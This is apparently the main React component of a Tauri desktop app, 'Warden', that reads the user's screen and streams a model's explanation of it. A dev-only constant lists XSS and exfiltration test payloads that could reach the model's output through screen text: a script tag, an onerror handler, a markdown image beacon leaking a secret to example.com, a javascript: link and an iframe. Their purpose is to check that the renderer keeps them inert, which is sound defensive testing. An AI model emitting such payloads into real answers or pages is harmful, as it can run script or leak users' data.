import { useCallback, useEffect, useRef, useState } from "react";
import { invoke, Channel } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";
import { Answer } from "./Answer";
import "./App.css";

// PLAN.md section 2 wants this in a config file — capture/prompt.txt already does
// that for the CLI. E1 owns making it tunable without a rebuild.
const PROMPT =
  "What am I looking at? If there's an error or something broken, explain it and the fix. Otherwise explain what matters here.";

/**
 * Dev-only. Every one of these could appear in a model answer, because the model
 * transcribes whatever is on screen — including text engineered to be there.
 * All of them must render as inert text or nothing, and none may cause a network
 * request. The image case is the subtle one: it needs no scripting to leak data,
 * only to be rendered.
 */
const INJECTION_CASES = [
  "---",
  "### Injection cases — all of these must be inert",
  "",
  "1. Script tag: <script>alert('xss')</script>",
  "2. Image handler: <img src=x onerror=\"alert('xss')\">",
  "3. Markdown image beacon: ![leak](https://example.com/beacon.png?d=secret)",
  "4. Markdown link: [click me](https://example.com/phish)",
  "5. Javascript URL: [go](javascript:alert('xss'))",
  "6. Raw iframe: <iframe src=\"https://example.com\"></iframe>",
].join("\n");

type StreamEvent =
  | { event: "captured"; data: { width: number; height: number; pngBytes: number } }
  | { event: "token"; data: { text: string } }
  | {
      event: "done";
      data: { promptEvalCount: number; evalCount: number; totalMs: number; ttftMs: number };
    };

function App() {
  const [answer, setAnswer] = useState("");
  const [status, setStatus] = useState("");
  const [stats, setStats] = useState("");
  const [error, setError] = useState("");
  const [hotkey, setHotkey] = useState<string | null>(null);
  const [probe, setProbe] = useState("");

  const busy = useRef(false);
  const scrollRef = useRef<HTMLDivElement>(null);

  // Dev-only: `?preview` renders a real saved answer plus the injection cases,
  // in a plain browser with no Warden process. Smart App Control blocks the
  // built binary, and this work doesn't need it.
  useEffect(() => {
    if (!import.meta.env.DEV) return;
    if (!new URLSearchParams(location.search).has("preview")) return;
    import("./sample-answer").then(({ SAMPLE }) => {
      // Two separate documents, never one concatenated string. The saved answer
      // was truncated at the token cap mid-fence, and that unclosed fence
      // swallowed the entire injection block - so the cases rendered as code and
      // the test silently passed by never running. Separate instances cannot.
      setAnswer(SAMPLE);
      setProbe(INJECTION_CASES);
      setStats(`preview · ${SAMPLE.length.toLocaleString()} chars`);
    });
  }, []);
  // Follow the bottom while streaming, but stop the moment the reader scrolls
  // up to re-read something — and resume on the next answer.
  const pinned = useRef(true);

  const ask = useCallback(async () => {
    if (busy.current) return;
    busy.current = true;

    setAnswer("");
    setStats("");
    setError("");
    setStatus("Capturing…");
    pinned.current = true;

    const onEvent = new Channel<StreamEvent>();
    onEvent.onmessage = (message) => {
      if (message.event === "captured") {
        setStatus("Reading your screen…");
      } else if (message.event === "token") {
        setStatus("");
        // Functional update: several tokens can land in one React tick.
        setAnswer((prev) => prev + message.data.text);
      } else {
        const d = message.data;
        setStats(
          `${d.promptEvalCount} in · ${d.evalCount} out · ${(d.ttftMs / 1000).toFixed(2)}s to first · ${(d.totalMs / 1000).toFixed(1)}s total`
        );
      }
    };

    try {
      await invoke("ask_about_screen", { prompt: PROMPT, model: null, onEvent });
    } catch (e) {
      setError(String(e));
      setStatus("");
    } finally {
      busy.current = false;
    }
  }, []);

  useEffect(() => {
    const unlisten = listen("warden://summoned", () => void ask());
    return () => void unlisten.then((f) => f());
  }, [ask]);

  useEffect(() => {
    invoke<string | null>("hotkey_label").then(setHotkey).catch(() => setHotkey(null));
  }, []);

  // Keep the newest text in view, unless the reader has deliberately scrolled up.
  // `instant`, not `smooth` — smooth scrolling fights rapid successive appends.
  useEffect(() => {
    const el = scrollRef.current;
    if (el && pinned.current) {
      el.scrollTo({ top: el.scrollHeight, behavior: "instant" });
    }
  }, [answer]);

  // Grow the window to fit the answer, within bounds, and re-anchor it.
  useEffect(() => {
    const el = scrollRef.current;
    if (!el) return;
    const chrome = 96; // header, stats line, padding
    invoke("fit_window", { contentHeight: Math.ceil(el.scrollHeight) + chrome }).catch(
      () => {}
    );
  }, [answer, stats]);

  function onScroll() {
    const el = scrollRef.current;
    if (!el) return;
    const distanceFromBottom = el.scrollHeight - el.scrollTop - el.clientHeight;
    pinned.current = distanceFromBottom < 50;
  }

  return (
    <main className="popup">
      <header>
        <span className="mark">Warden</span>
        {hotkey ? (
          <span className="hint">{hotkey}</span>
        ) : (
          <span className="hint warn">no hotkey bound</span>
        )}
      </header>

      {status && <p className="status">{status}</p>}
      {error && <pre className="error">{error}</pre>}

      {(answer || probe) && (
        <div className="scroll" ref={scrollRef} onScroll={onScroll}>
          {answer && <Answer text={answer} />}
          {probe && <Answer text={probe} />}
        </div>
      )}

      {stats && <p className="stats">{stats}</p>}

      {!status && !answer && !error && (
        <p className="idle">
          Press {hotkey ?? "your hotkey"} anywhere to ask about your screen.
          <br />
          Press it again to dismiss.
        </p>
      )}
    </main>
  );
}

export default App;
